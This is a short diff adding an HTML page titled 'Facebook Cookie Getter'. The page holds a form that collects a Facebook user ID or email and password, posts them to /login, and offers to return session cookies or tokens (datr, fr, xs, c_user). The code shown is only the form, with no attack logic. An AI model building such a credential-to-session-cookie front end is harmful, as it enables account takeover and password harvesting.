@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Facebook Cookie Getter</title>
+    <link rel="stylesheet" href="/style.css">
+</head>
+<body>
+<div class="terminal">
+    <form method="POST" action="/login">
+        <label>User ID/Email:</label>
+        <input type="text" name="user" required>
+        <label>Password:</label>
+        <input type="password" name="pass" required>
+        <label>Choose Method:</label>
+        <select name="mode">
+            <option value="1">Cookie 1 (datr, fr, xs)</option>
+            <option value="2">Cookie 2 (c_user + token)</option>
+        </select>
+        <button type="submit">Submit</button>
+    </form>
+</div>
+</body>
+</html>
